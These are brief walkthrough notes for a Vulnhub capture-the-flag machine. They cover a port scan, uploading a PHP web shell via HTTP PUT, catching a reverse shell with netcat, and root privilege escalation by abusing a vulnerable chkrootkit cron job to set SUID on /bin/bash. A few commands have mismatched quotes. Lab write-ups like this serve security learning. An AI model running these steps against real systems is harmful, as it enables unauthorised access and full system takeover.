```
rustscan --ulimit 5000 192.168.1.47 -- -sC -sV -Pn -vvv --script http-methods -script-args http-methods.url-path=<http://192.168.1.47/test/> 

curl -T shell.php <http://192.168.1.47/test/shell.php>
 
curl -T shell.php <http://192.168.1.47/test/shell.php> --http1.0

<http://192.168.1.47/test/shell.php>

rlwrap nc -lvnp 443
```

SHELL :D

We see no very interesting suid binaries or sudo permissions, so next we check cronjobs in all the locations
```
cat /etc/crontab
ls /etc/cron*
cat /etc/cron*
cat /etc/cron.d
cat /var/spool/cron/*
```


We see chkrootkit privesc

```
dpkg -l | grep chkrootkit 
```

Awesome, same version

using pspy you can see this is being ran by likely root

```
echo ‘#!/bin/bash’ > update
echo 'chmod +s /bin/bash >> update
chmod +x update

ls -la /bin/bash
```
wait....

BAM![unnamed_36c34e13e5cb41b5be93564ad708b9f4](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/sick%20os/notes/{{notename}}-202605011742.png)
![unnamed_cb58d5b6e2f449239a0276e7958c0a17](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/sick%20os/notes/{{notename}}-202605011742-1.png)
![unnamed_538a061279d04cd88973cbe3579d20d6](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/sick%20os/notes/{{notename}}-202605011742-2.png)
![unnamed_d2ca5e7a9e7140ae93fe305b08454e06](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/sick%20os/notes/{{notename}}-202605011743.png)
![unnamed_25f8829c7f434175a196602a6aa67474](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/sick%20os/notes/{{notename}}-202605011743-1.png)
![unnamed_350d65011a674a42b416589614c50140](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/sick%20os/notes/{{notename}}-202605011743-2.png)